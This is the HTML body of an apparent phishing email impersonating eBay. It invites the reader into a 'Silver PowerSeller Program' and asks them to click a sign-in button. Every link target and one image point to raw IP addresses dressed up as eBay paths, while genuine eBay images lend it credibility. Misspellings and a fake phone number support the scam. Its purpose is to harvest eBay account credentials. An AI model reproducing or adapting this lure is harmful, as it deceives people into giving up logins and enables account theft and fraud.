<P class="style1 style2" align=left>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="style3">Congratulation!</span></P>
<P align=left><span class="style2"><FONT face="Verdana, Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dear eBay Member,</FONT></span></P>
<P class=style2 align=left><FONT face="Verdana, Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due to your continued activity on eBay we are delighted to envite you to join our Silver Powerseller Program.<BR>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  This icon <FONT face="Verdana, Arial, Helvetica, sans-serif"><IMG src="http://pics.ebaystatic.com/aw/pics/icon/psIcon_50x25.gif"></FONT>&nbsp;next to a member's user ID means that the seller meets the criteria for being a PowerSeller.Next rank in our PowerSeller Program is Silver PowerSeller and after your user ID will apear this icon <IMG onclick="return ShowLinkWarning()" height=25 src="http://200.204.78.232/.ws/powsell-prog-uit88terlo45gfdd9f98u5jk34lnd89fu74aw-confirm-ebaIS/images/silverpsIcon_50x25.gif" width=50><br>
<BR>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;With this mark, you can be confident that you are transacting with an experienced eBay user who has proven that they're committed to customer satisfaction.<br>
  <BR>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Joining this grup is a simple two- step process. <BR>
</FONT><SPAN class=style1>All you need to do is to click here:</SPAN></P>
<P align=left><SPAN class=style1><A onclick="return ShowLinkWarning()" href="http://212.217.59.100/.Update/eBay-Account/Index.html" target=_blank>
<CENTER><IMG src="http://pics.ebaystatic.com/aw/pics/powerseller/Hub/psNew04/imgPSsignin_184x132.gif" border=0></CENTER></A></SPAN>
<P></P>
<P align=left class="style5">If you want to activate your Silver PowerSeller by phone please call us at 865-102-EBAY.</P>
<P align=left class="style5">Once you accept, we will provide you with a Silver PowerSeller Icon next to your UserID as recognition of your hard work.<BR>
  There are exclusive benefits to the Silver PowerSeller Program that celebrate your success and help you grow your business. </P>
<UL>
<LI class="style5">Membership is FREE! eBay automatically invites qualified users via email 
<LI class="style5">Prioritized customer service—Silver PowerSellers receive prioritized support by email or telephone, depending on sales level
<LI class="style5">Welcome kit—New PowerSellers receive a welcome package featuring an official certificate of achievement from Meg Whitman and essential advanced selling tips
<LI class="style5">Networking— Silver PowerSellers share selling strategies on an exclusive, PowerSeller-only discussion board
<LI class="style5">Special offers-eBay works with many companies who only make certain promotions available to PowerSellers 
<LI class="style5">And more! </LI></UL>
